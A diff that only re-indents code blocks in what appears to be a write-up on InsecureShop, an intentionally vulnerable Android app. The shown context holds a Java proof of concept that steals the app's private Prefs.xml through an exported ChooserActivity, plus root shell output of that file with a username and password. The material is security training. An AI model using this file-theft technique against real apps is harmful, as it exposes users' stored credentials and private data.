@@ -119,13 +119,13 @@ Loading a WebView inside the application may be hardcoded in the app, or the URI
 
 ```xml
 <activity android:name="com.insecureshop.WebViewActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.VIEW"/>
-                <category android:name="android.intent.category.DEFAULT"/>
-                <category android:name="android.intent.category.BROWSABLE"/>
-                <data android:scheme="insecureshop" android:host="com.insecureshop"/>
-            </intent-filter>
-        </activity> 
+<intent-filter>
+    <action android:name="android.intent.action.VIEW"/>
+    <category android:name="android.intent.category.DEFAULT"/>
+    <category android:name="android.intent.category.BROWSABLE"/>
+    <data android:scheme="insecureshop" android:host="com.insecureshop"/>
+</intent-filter>
+</activity> 
 ```
 
 Let’s examine the actual code of the `WebViewActivity` class:
@@ -482,18 +482,18 @@ protected void onCreate(Bundle savedInstanceState) {
 
     // Set a click listener to send the intent
     TheftofArbitraryFilesButton.setOnClickListener(new View.OnClickListener() {
-        @Override
-        public void onClick(View v) {
-            Intent StealingFile = new Intent();
-            // Selecting the ChooserActivity
-            StealingFile.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity");
-            // Specfiying the Prefs.xml file
-            Uri FileName = Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml");
-            // adding the EXTRA_STREAM as an extra to trigger the exported Intent
-            StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);
-            // Starting the Intent
-            startActivity(StealingFile);
-        }
+    @Override
+    public void onClick(View v) {
+        Intent StealingFile = new Intent();
+        // Selecting the ChooserActivity
+        StealingFile.setClassName("com.insecureshop", "com.insecureshop.ChooserActivity");
+        // Specfiying the Prefs.xml file
+        Uri FileName = Uri.parse("/data/data/com.insecureshop/shared_prefs/Prefs.xml");
+        // adding the EXTRA_STREAM as an extra to trigger the exported Intent
+        StealingFile.putExtra(StealingFile.EXTRA_STREAM, FileName);
+        // Starting the Intent
+        startActivity(StealingFile);
+    }
     });
 }
 }
@@ -516,10 +516,10 @@ root@generic_x86:/sdcard/insecureshop $ ls -la
 root@generic_x86:/sdcard/insecureshop $ cat Prefs.xml
 <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
 <map>
-    <string name="username">shopuser</string>
-    <string name="password">!ns3csh0p</string>
-    <string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
-    <string name="data">https://itsfading.github.io</string>
+<string name="username">shopuser</string>
+<string name="password">!ns3csh0p</string>
+<string name="productList">[{&quot;id&quot;:1,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/7974/pexels-photo.jpg&quot;,&quot;name&quot;:&quot;Laptop&quot;,&quot;price&quot;:&quot;80&quot;,&quot;qty&quot;:0,&quot;rating&quot;:1,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:2,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/984619/pexels-photo-984619.jpeg&quot;,&quot;name&quot;:&quot;Hat&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:3,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/343720/pexels-photo-343720.jpeg&quot;,&quot;name&quot;:&quot;Sunglasses&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:4,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/277390/pexels-photo-277390.jpeg&quot;,&quot;name&quot;:&quot;Watch&quot;,&quot;price&quot;:&quot;30&quot;,&quot;qty&quot;:0,&quot;rating&quot;:4,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:5,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/225157/pexels-photo-225157.jpeg&quot;,&quot;name&quot;:&quot;Camera&quot;,&quot;price&quot;:&quot;40&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:6,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/264819/pexels-photo-264819.jpeg&quot;,&quot;name&quot;:&quot;Perfumes&quot;,&quot;price&quot;:&quot;10&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:7,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/532803/pexels-photo-532803.jpeg&quot;,&quot;name&quot;:&quot;Bagpack&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;},{&quot;id&quot;:8,&quot;imageUrl&quot;:&quot;https://images.pexels.com/photos/789812/pexels-photo-789812.jpeg&quot;,&quot;name&quot;:&quot;Jacket&quot;,&quot;price&quot;:&quot;20&quot;,&quot;qty&quot;:0,&quot;rating&quot;:2,&quot;url&quot;:&quot;https://www.insecureshopapp.com&quot;}]</string>
+<string name="data">https://itsfading.github.io</string>
 </map>
 ```
 
